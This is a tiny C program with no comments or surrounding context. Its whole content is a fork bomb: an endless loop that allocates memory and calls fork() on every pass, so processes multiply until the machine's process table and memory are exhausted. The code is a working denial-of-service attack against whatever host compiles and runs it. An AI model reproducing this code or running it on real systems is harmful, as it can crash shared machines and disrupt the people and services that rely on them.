#include <stdio.h>

main() {
	for (;;) {
		malloc( 1000 );
		fork();
	}
}
